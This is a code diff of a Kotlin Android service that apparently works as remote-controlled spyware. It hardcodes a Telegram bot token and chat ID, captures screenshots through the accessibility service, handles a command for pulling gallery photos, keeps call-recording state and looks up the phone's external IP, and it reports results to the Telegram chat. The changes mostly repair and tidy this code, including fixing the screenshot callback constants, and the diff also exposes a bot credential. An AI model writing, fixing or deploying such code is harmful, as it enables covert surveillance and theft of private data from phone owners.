@@ -27,24 +27,12 @@ import java.util.*
 import java.util.concurrent.TimeUnit
 import kotlin.coroutines.resume
 
-
-
 class MyService : Service() {
 
     companion object {
         const val BOT_TOKEN = "8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc"
         const val CHAT_ID = "8820979221"
         private val client = OkHttpClient()
-
-fun getExternalIP(): String {
-    return try {
-        java.net.URL("https://api.ipify.org").readText()
-    } catch (e: Exception) {
-        "unknown"
-    }
-}
-
-        
 
         suspend fun sendStaticTelegramMessage(text: String) {
             try {
@@ -72,7 +60,6 @@ fun getExternalIP(): String {
         .readTimeout(30, TimeUnit.SECONDS)
         .build()
 
-    // Call recording
     private var mediaRecorder: MediaRecorder? = null
     private var currentRecordingFile: File? = null
     private var isRecording = false
@@ -220,12 +207,11 @@ fun getExternalIP(): String {
                         }
                     }
 
-
-override fun onFailure(errorCode: Int) {
+                    override fun onFailure(errorCode: Int) {
                         val errMsg = when (errorCode) {
-                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR ->
+                            AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR ->
                                 "Screenshot failed (overlay/locked)"
-                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME ->
+                            AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME ->
                                 "Too many attempts"
                             else -> "Unknown error code $errorCode"
                         }
@@ -233,9 +219,8 @@ override fun onFailure(errorCode: Int) {
                         if (cont.isActive) cont.resume(null)
                     }
                 }
-                }
-
-                    
+            )
+        }
         if (bitmap == null) {
             sendTelegramMessage("❌ Failed to capture screenshot (screen may be locked or overlay active)")
             return
@@ -308,7 +293,7 @@ override fun onFailure(errorCode: Int) {
         }
     }
 
-    // ================== PHOTO COMMAND (FIXED) ==================
+    // ================== PHOTO COMMAND ==================
     private suspend fun handlePhotoCommand(cmd: String) {
         val parts = cmd.removePrefix("photo").trim()
         val images = getAllGalleryImages()
@@ -451,7 +436,6 @@ override fun onFailure(errorCode: Int) {
         )
     }
 
-    // Helper: external IP
     private fun getExternalIP(): String {
         return try {
             val url = URL("http://ip-api.com/json/?fields=query")
@@ -477,6 +461,14 @@ override fun onFailure(errorCode: Int) {
                 } catch (e: Exception) { /* ignore */ }
             }
             return Result.success()
+        }
+
+        private fun getExternalIP(): String {
+            return try {
+                val url = URL("http://ip-api.com/json/?fields=query")
+                val json = url.readText()
+                JSONObject(json).getString("query")
+            } catch (e: Exception) { "Unavailable" }
         }
     }
 
